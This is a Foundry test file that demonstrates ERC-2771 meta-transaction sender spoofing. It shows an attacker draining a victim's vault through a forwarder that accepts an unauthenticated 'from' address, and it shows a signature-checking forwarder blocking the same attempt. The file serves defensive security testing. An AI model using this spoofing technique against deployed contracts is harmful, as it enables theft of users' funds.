// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {Vault, VulnerableForwarder, SafeForwarder} from "../src/meta-tx/Forwarder.sol";

/// PoC for meta-transaction `_msgSender()` spoofing (ERC-2771 forwarder trust).
///   forge test --match-contract MetaTxMsgSenderSpoof -vvv
///
/// Invariant (SC01): only the holder of an account's key can move that account's funds. A target
/// that derives the caller from forwarder-appended calldata holds this only if the forwarder
/// authenticates the appended address. The vulnerable forwarder appends an unauthenticated `from`,
/// so an attacker drains a victim by naming them; the signature-checking forwarder rejects it.
///
/// See docs/exploits/meta-tx-msgsender-spoof.md
contract MetaTxMsgSenderSpoofTest is Test {
    address victim;
    uint256 victimPk;
    address attacker = makeAddr("attacker");

    function setUp() public {
        (victim, victimPk) = makeAddrAndKey("victim");
    }

    function test_vulnerable_attackerStealsVictimFundsToSelf() public {
        VulnerableForwarder fwd = new VulnerableForwarder();
        Vault vault = new Vault(address(fwd));

        // Victim deposits 10 ETH into the vault.
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vault.deposit{value: 10 ether}(victim);
        assertEq(vault.balances(victim), 10 ether);

        // Attacker relays `withdraw(10, attacker)` but names the VICTIM as `from`. No signature.
        // The vault debits `_msgSender() == victim` and pays the attacker-chosen recipient.
        uint256 attackerBefore = attacker.balance;
        vm.prank(attacker);
        fwd.execute(
            address(vault), victim, abi.encodeWithSignature("withdraw(uint256,address)", 10 ether, attacker)
        );

        assertEq(vault.balances(victim), 0, "victim debited without consent");
        assertEq(attacker.balance, attackerBefore + 10 ether, "attacker stole the victim's funds");
    }

    function test_safe_spoofedFromRejectedWithoutSignature() public {
        SafeForwarder fwd = new SafeForwarder();
        Vault vault = new Vault(address(fwd));

        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vault.deposit{value: 10 ether}(victim);

        // Attacker tries to relay withdraw as the victim, but has no valid victim signature.
        bytes memory data = abi.encodeWithSignature("withdraw(uint256,address)", 10 ether, attacker);
        bytes memory badSig = new bytes(65);
        vm.prank(attacker);
        vm.expectRevert(bytes("bad signature"));
        fwd.execute(address(vault), victim, data, badSig);

        assertEq(vault.balances(victim), 10 ether, "victim funds untouched");
    }

    function test_safe_genuineSignedRequestSucceeds() public {
        SafeForwarder fwd = new SafeForwarder();
        Vault vault = new Vault(address(fwd));

        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vault.deposit{value: 10 ether}(victim);

        // The victim themselves signs a withdraw request; a relayer submits it.
        bytes memory data = abi.encodeWithSignature("withdraw(uint256,address)", 10 ether, victim);
        bytes32 structHash =
            keccak256(abi.encode(fwd.REQ_TYPEHASH(), victim, address(vault), fwd.nonces(victim), keccak256(data)));
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", fwd.domainSeparator(), structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(victimPk, digest);

        vm.prank(attacker); // any relayer can submit a properly signed request
        fwd.execute(address(vault), victim, data, abi.encodePacked(r, s, v));

        assertEq(vault.balances(victim), 0, "victim's own signed withdraw processed");
    }
}
